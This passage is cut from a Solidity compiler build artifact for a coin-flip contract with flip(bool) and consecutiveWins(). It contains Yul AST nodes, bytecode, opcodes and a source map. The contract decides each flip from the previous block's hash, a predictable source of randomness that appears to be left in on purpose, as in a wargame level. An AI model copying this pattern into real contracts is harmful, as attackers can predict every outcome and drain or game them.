												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1628:9:3",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1640:6:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1651:4:3",
														"type": ""
													}
												],
												"src": "1558:222:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1814:152:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1831:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1834:77:3",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1824:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1824:88:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1824:88:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1928:1:3",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1931:4:3",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1921:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1921:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1921:15:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1952:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1955:4:3",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1945:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1945:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1945:15:3"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1786:180:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2015:190:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2025:33:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2052:5:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2034:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2034:24:3"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "2025:5:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2148:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2150:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2150:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2150:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2073:5:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2080:66:3",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "2070:2:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2070:77:3"
															},
															"nodeType": "YulIf",
															"src": "2067:103:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2179:20:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2190:5:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2197:1:3",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2186:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2186:13:3"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "2179:3:3"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2001:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "2011:3:3",
														"type": ""
													}
												],
												"src": "1972:233:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2256:146:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2266:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2289:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2271:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2271:20:3"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2266:1:3"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2300:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2323:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2305:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2305:20:3"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2300:1:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2347:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2349:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2349:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2349:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2341:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2344:1:3"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "2338:2:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2338:8:3"
															},
															"nodeType": "YulIf",
															"src": "2335:34:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2379:17:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2391:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2394:1:3"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "2387:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2387:9:3"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "2379:4:3"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2242:1:3",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2245:1:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "2251:4:3",
														"type": ""
													}
												],
												"src": "2211:191:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2436:152:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2453:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2456:77:3",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2446:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2446:88:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2446:88:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2550:1:3",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2553:4:3",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2543:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2543:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2543:15:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2574:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2577:4:3",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2567:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2567:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2567:15:3"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2408:180:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2636:143:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2646:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2669:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2651:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2651:20:3"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2646:1:3"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2680:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2703:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2685:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2685:20:3"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2680:1:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2727:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "2729:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2729:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2729:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2724:1:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2717:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2717:9:3"
															},
															"nodeType": "YulIf",
															"src": "2714:35:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2759:14:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2768:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2771:1:3"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "2764:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2764:9:3"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "2759:1:3"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2625:1:3",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2628:1:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "2634:1:3",
														"type": ""
													}
												],
												"src": "2594:185:3"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n}\n",
									"id": 3,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061019b565b610089565b60405161006291906101d7565b60405180910390f35b61007361012c565b604051610080919061020b565b60405180910390f35b6000806100a060014361013290919063ffffffff16565b4060001c905080600154036100b457600080fd5b8060018190555060006100d26002548361014890919063ffffffff16565b90506000600182146100e55760006100e8565b60015b9050841515811515036101185760008081548092919061010790610255565b919050555060019350505050610127565b60008081905550600093505050505b919050565b60005481565b60008183610140919061029d565b905092915050565b600081836101569190610300565b905092915050565b600080fd5b60008115159050919050565b61017881610163565b811461018357600080fd5b50565b6000813590506101958161016f565b92915050565b6000602082840312156101b1576101b061015e565b5b60006101bf84828501610186565b91505092915050565b6101d181610163565b82525050565b60006020820190506101ec60008301846101c8565b92915050565b6000819050919050565b610205816101f2565b82525050565b600060208201905061022060008301846101fc565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610260826101f2565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361029257610291610226565b5b600182019050919050565b60006102a8826101f2565b91506102b3836101f2565b9250828210156102c6576102c5610226565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061030b826101f2565b9150610316836101f2565b925082610326576103256102d1565b5b82820490509291505056fea2646970667358221220482a8f1b0bdf0f239afa5679974bb9be95f3f3c7b90e3def45056861dddd664664736f6c634300080d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x19B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x1D7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x12C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x20B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xA0 PUSH1 0x1 NUMBER PUSH2 0x132 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD SUB PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH2 0xD2 PUSH1 0x2 SLOAD DUP4 PUSH2 0x148 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xE5 JUMPI PUSH1 0x0 PUSH2 0xE8 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x118 JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x107 SWAP1 PUSH2 0x255 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x127 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x140 SWAP2 SWAP1 PUSH2 0x29D JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x156 SWAP2 SWAP1 PUSH2 0x300 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x178 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP2 EQ PUSH2 0x183 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x195 DUP2 PUSH2 0x16F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1B1 JUMPI PUSH2 0x1B0 PUSH2 0x15E JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1BF DUP5 DUP3 DUP6 ADD PUSH2 0x186 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1D1 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1EC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x205 DUP2 PUSH2 0x1F2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x220 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1FC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x260 DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x292 JUMPI PUSH2 0x291 PUSH2 0x226 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A8 DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x2B3 DUP4 PUSH2 0x1F2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x2C6 JUMPI PUSH2 0x2C5 PUSH2 0x226 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x30B DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x316 DUP4 PUSH2 0x1F2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x326 JUMPI PUSH2 0x325 PUSH2 0x2D1 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 BASEFEE 0x2A DUP16 SHL SIGNEXTEND 0xDF 0xF 0x23 SWAP11 STATICCALL JUMP PUSH26 0x974BB9BE95F3F3C7B90E3DEF45056861DDDD664664736F6C6343 STOP ADDMOD 0xD STOP CALLER ",
							"sourceMap": "65:728:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;337:453;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;121:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;337:453;380:4;393:18;432:19;449:1;432:12;:16;;:19;;;;:::i;:::-;422:30;414:39;;393:60;;478:10;466:8;;:22;462:53;;499:8;;;462:53;534:10;523:8;:21;;;;551:16;570:22;585:6;;570:10;:14;;:22;;;;:::i;:::-;551:41;;599:9;623:1;611:8;:13;:28;;634:5;611:28;;;627:4;611:28;599:40;;660:6;652:14;;:4;:14;;;648:137;;677:15;;:17;;;;;;;;;:::i;:::-;;;;;;710:4;703:11;;;;;;;648:137;755:1;737:15;:19;;;;772:5;765:12;;;;;337:453;;;;:::o;121:30::-;;;;:::o;3213:98:2:-;3271:7;3302:1;3298;:5;;;;:::i;:::-;3291:12;;3213:98;;;;:::o;3969:::-;4027:7;4058:1;4054;:5;;;;:::i;:::-;4047:12;;3969:98;;;;:::o;88:117:3:-;197:1;194;187:12;334:90;368:7;411:5;404:13;397:21;386:32;;334:90;;;:::o;430:116::-;500:21;515:5;500:21;:::i;:::-;493:5;490:32;480:60;;536:1;533;526:12;480:60;430:116;:::o;552:133::-;595:5;633:6;620:20;611:29;;649:30;673:5;649:30;:::i;:::-;552:133;;;;:::o;691:323::-;747:6;796:2;784:9;775:7;771:23;767:32;764:119;;;802:79;;:::i;:::-;764:119;922:1;947:50;989:7;980:6;969:9;965:22;947:50;:::i;:::-;937:60;;893:114;691:323;;;;:::o;1020:109::-;1101:21;1116:5;1101:21;:::i;:::-;1096:3;1089:34;1020:109;;:::o;1135:210::-;1222:4;1260:2;1249:9;1245:18;1237:26;;1273:65;1335:1;1324:9;1320:17;1311:6;1273:65;:::i;:::-;1135:210;;;;:::o;1351:77::-;1388:7;1417:5;1406:16;;1351:77;;;:::o;1434:118::-;1521:24;1539:5;1521:24;:::i;:::-;1516:3;1509:37;1434:118;;:::o;1558:222::-;1651:4;1689:2;1678:9;1674:18;1666:26;;1702:71;1770:1;1759:9;1755:17;1746:6;1702:71;:::i;:::-;1558:222;;;;:::o;1786:180::-;1834:77;1831:1;1824:88;1931:4;1928:1;1921:15;1955:4;1952:1;1945:15;1972:233;2011:3;2034:24;2052:5;2034:24;:::i;:::-;2025:33;;2080:66;2073:5;2070:77;2067:103;;2150:18;;:::i;:::-;2067:103;2197:1;2190:5;2186:13;2179:20;;1972:233;;;:::o;2211:191::-;2251:4;2271:20;2289:1;2271:20;:::i;:::-;2266:25;;2305:20;2323:1;2305:20;:::i;:::-;2300:25;;2344:1;2341;2338:8;2335:34;;;2349:18;;:::i;:::-;2335:34;2394:1;2391;2387:9;2379:17;;2211:191;;;;:::o;2408:180::-;2456:77;2453:1;2446:88;2553:4;2550:1;2543:15;2577:4;2574:1;2567:15;2594:185;2634:1;2651:20;2669:1;2651:20;:::i;:::-;2646:25;;2685:20;2703:1;2685:20;:::i;:::-;2680:25;;2724:1;2714:35;;2729:18;;:::i;:::-;2714:35;2771:1;2768;2764:9;2759:14;;2594:185;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "174200",
								"executionCost": "27340",
								"totalCost": "201540"
							},
							"external": {
								"consecutiveWins()": "2429",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 65,
									"end": 793,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 65,
									"end": 793,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 65,
									"end": 793,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 194,
									"end": 271,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 177,
									"end": 271,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 177,
									"end": 271,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 278,
									"end": 331,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 278,
									"end": 331,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 278,
									"end": 331,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 278,
									"end": 331,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 278,
									"end": 331,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 278,
									"end": 331,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 278,
									"end": 331,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 278,
									"end": 331,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 278,
									"end": 331,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 278,
									"end": 331,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 278,
									"end": 331,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 324,
									"end": 325,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 306,
									"end": 321,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 306,
									"end": 325,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 306,
									"end": 325,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 306,
									"end": 325,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 306,
									"end": 325,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 65,
									"end": 793,
									"name": "PUSH #[$]",
